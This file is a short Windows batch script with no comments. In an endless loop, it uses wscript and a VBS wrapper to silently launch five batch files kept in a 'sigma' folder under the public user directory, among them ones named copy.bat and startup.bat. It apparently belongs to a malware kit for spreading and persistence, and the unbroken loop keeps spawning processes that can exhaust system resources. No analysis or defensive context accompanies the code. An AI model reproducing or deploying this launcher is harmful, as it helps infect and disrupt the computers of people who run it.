@echo off
:loop
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
goto loop
